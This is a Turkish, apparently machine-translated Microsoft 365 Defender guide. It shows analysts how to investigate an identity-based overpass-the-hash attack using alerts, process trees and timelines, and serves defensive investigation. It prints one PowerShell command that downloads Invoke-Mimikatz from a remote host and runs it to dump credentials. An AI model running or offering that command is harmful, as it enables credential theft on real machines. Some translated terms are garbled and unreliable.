---
title: Kimlik tabanlı bir saldırı örneği
description: Kimlik tabanlı bir saldırının örnek çözümlemesinde adım adım ilerler.
keywords: olaylar, uyarılar, araştırma, korelasyon, saldırı, makineler, cihazlar, kullanıcılar, kimlikler, kimlik, posta kutusu, e-posta, 365, microsoft, m365, olay yanıtı, siber saldırı
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 883c0480b5f8cb35abfe59458d35c8d1274b8493
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 03/08/2022
ms.locfileid: "63327545"
---
# <a name="example-of-an-identity-based-attack"></a>Kimlik tabanlı bir saldırı örneği

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Aşağıdakiler için geçerlidir:**
- Microsoft 365 Defender

Identity için Microsoft Defender, kötü amaçlı girişimlerin, organizasyon kimliklerini tehlikeye atarak algılamaya yardımcı olabilir. Identity için Defender, Microsoft 365 Defender ile tümleştiri olduğundan, güvenlik analistleri şüpheli Netlogon ayrıcalık yükseltme girişimleri gibi Identity için Defender'dan gelen tehditlere karşı görünürlük sağlar.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Saldırıyı Identity için Microsoft Defender'da çözümleme

Microsoft 365 Defender, analistlerin olaylar sayfasının Uyarılar sekmesindeki algılama kaynağıyla **uyarıları** filtrelemelerine olanak sağlar. Aşağıdaki örnekte algılama kaynağı, Kimlik için Defender olarak **filtre uygulanmıştır**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Identity için Defender algılama kaynağını filtreleme örneği.":::

Şüpheli **üstteki karmser saldırı** uyarısının seçili olması, Bulut Uygulamaları için Microsoft Defender'da daha ayrıntılı bilgi görüntüleyen bir sayfaya gider. Her zaman bir uyarı veya saldırı hakkında daha fazla bilgi edinmek için Bu uyarı  türü hakkında daha fazla bilgi alın öğesini seçerek [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) saldırının açıklamasını ve düzeltme önerilerini okuyabilirsiniz.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Şüpheli üstteki karmser saldırı uyarısı örneği."::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Uç Nokta için Microsoft Defender'da aynı saldırıyı araştırıyor

Alternatif olarak, bir analist uç nokta üzerinde etkinlik hakkında daha fazla bilgi edinmek için Uç Nokta için Defender'ı kullanabilir. Olay sırasından olayı seçin ve sonra Uyarılar **sekmesini** seçin. Buradan, algılama kaynağını da tanımlayabilirler. EDR olarak etiketlenmiş algılama kaynağı, Uç Nokta için Defender olan Uç Nokta Algılama ve Yanıt'ın açılımıdır. Buradan, analist EDR tarafından algılanan bir uyarıyı seçer.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Uç Nokta için Defender'da Uç Nokta Algılama ve Yanıt örneği."::: 

Uyarı sayfasında, etkilenen cihaz adı, kullanıcı adı, otomatik soruşturma durumu ve uyarı ayrıntıları gibi çeşitli bilgiler görüntülenir. Uyarı hikayesinde, işlem ağacının görsel bir gösterimi yer almaktadır. İşlem ağacı, uyarıyla ilgili üst ve alt işlemlerin hiyerarşik bir gösterimidir.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Uç Nokta için Defender'da uyarı işlemi ağacı örneği."::: 

Her işlem, ek ayrıntıları görüntülemek için genişletilebilir. Bir analistin göreceği ayrıntılar kötü amaçlı bir betiğin parçası olarak girilen gerçek komutlar, giden bağlantı IP adresleri ve diğer yararlı bilgilerdir.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Uç Nokta için Defender'daki işlem ayrıntıları örneği.":::
 
Zaman çizelgesinde **gör'i seçerek**, analist güvenlik güvenliğinin tam zamanı belirlemek için daha da detaya iner. 

Uç Nokta için Microsoft Defender birçok kötü amaçlı dosya ve betik algılanabilir. Bununla birlikte, giden bağlantılar, PowerShell ve komut satırı etkinliklerinin pek çok yasal kullanımı nedeniyle, kötü amaçlı bir dosya veya etkinlik oluşturana kadar bazı etkinlikler izin olarak kabul edilir. Bu nedenle, zaman çizelgesini kullanmak analistlerin ortak dosya sistemi ve kullanıcı etkinliğine yönelik saldırının özgün kaynağını veya saatlerini belirlemek üzere uyarıyı çevresindeki etkinlikle ilgili bağlama eklemesine yardımcı olur. 

Bunu yapmak için, bir analist uyarı algılama zamanında (kırmızı renkle) başlayabilir ve kötü amaçlı etkinliğin başladığı özgün etkinliğin ne zaman başlayacağını belirlemek için geriye doğru kaydırır. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Uyarı algılama zamanında başlama örneği."::: 

Windows Update bağlantıları, Windows Güvenilen Yazılım etkinleştirme trafiği, diğer Microsoft sitelerine yaygın bağlantılar, üçüncü taraf İnternet etkinliği, Microsoft Uç Nokta Yapılandırma Yöneticisi etkinliği ve diğer şüpheli etkinliklere karşı yaygın etkinlikleri anlamak ve ayırt etmek önemlidir. Bunu başarmanın bir yolu, zaman çizelgesi filtrelerini kullanmaktır. Analistin görüntülemek istemediklerini filtrelerlerken belirli etkinliği vurgulayan birçok filtre vardır. 

Aşağıdaki resimde, yalnızca ağ ve süreç olaylarını görüntülemek için filtrelenmiş analist. Bu, analistin Not Defteri'nin işlem ağacında da gördüğümüz IP adresiyle bağlantı kurduğu etkinliği çevreleyen ağ bağlantılarını ve süreçleri görmelerine olanak sağlar. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Kötü amaçlı giden bağlantı yapmak için Not Defteri'nin nasıl kullanılmış olduğunu gösterir."::: 

Bu özel olayda, Not Defteri kötü amaçlı giden bağlantı yapmak için kullanılmıştır. Bununla birlikte, genellikle saldırganlar kötü amaçlı yük indirmek için iexplorer.exe bağlantısı kurmak için kullanır çünkü normalde iexplorer.exe işlemleri normal web tarayıcısı etkinliği olarak kabul edilir.

Zaman çizelgesinde bakıla diğer bir öğe, PowerShell'in giden bağlantılar için kullandığı öğe olabilir. Analist, kötü amaçlı dosyayı barındıran bir web sitesine `IEX (New-Object Net.Webclient)` giden bağlantı gibi komutların ve ardından da giden bağlantının olduğu başarılı PowerShell bağlantılarını elde eder. 

Aşağıdaki örnekte, PowerShell bir web sitesinden Mimikatz'i indirmek ve yürütmek için kullanılmıştır:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Analist, yalnızca PowerShell ile oluşturulan olayları görüntülemek için arama çubuğuna anahtar sözcüğü yazarak anahtar sözcükleri hızla arayabilir. 

## <a name="next-step"></a>Sonraki adım

Kimlik avı [soruşturması](first-incident-path-phishing.md) yoluna bakın.

## <a name="see-also"></a>Ayrıca bkz.

- [Olaylara genel bakış](incidents-overview.md)
- [Olayları yönetme](manage-incidents.md)
- [Olayları araştırma](investigate-incidents.md)
